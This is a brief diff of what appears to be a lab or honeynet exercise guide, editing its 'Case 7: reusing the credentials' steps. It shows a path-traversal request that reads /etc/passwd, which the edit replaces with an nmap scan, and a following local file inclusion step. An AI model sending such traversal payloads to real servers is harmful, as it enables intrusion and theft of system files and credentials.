@@ -100,7 +100,7 @@ curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd
 #### [Advanced] Case 7: reusing the credentials
 1. Find Web Server
 ```
-curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
+sudo nmap -sS -sC -p80,443 <Honeynet IP> -vvv
 ```
 2. Perform LFI
 ```
